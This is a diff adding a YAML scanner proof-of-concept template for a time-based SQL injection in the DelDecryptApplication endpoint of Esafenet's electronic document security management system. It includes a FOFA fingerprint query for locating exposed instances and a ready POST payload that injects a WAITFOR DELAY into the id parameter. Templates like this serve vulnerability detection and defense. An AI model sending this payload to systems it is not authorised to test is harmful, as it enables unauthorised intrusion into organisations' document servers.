@@ -1,0 +1,20 @@
+id: poc-yaml-yisaitong-esafenet-deldecryptapplication-sqli
+info:
+  name: 亿赛通电子文档安全管理系统 DelDecryptApplication SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 亿赛通电子文档安全管理系统
+  fofa: app="亿赛通-电子文档安全管理系统"
+variables:
+  t1: random_int(3,8)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /CDGServer3/client/DecryptApplication;Servicelogin
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: id=1'WAITFOR+DELAY'0%3a0%3a{{.t1}}'--&machineId=&command=DelDecryptApplication&fromurl=/frame.jsp&appUser=
+  expression: status_code == 200 && contains(body,"电子文档安全管理系统") && contains(headers,"Path=/CDGServer3")
+    && duration > t1 && duration < t2
+transport: http
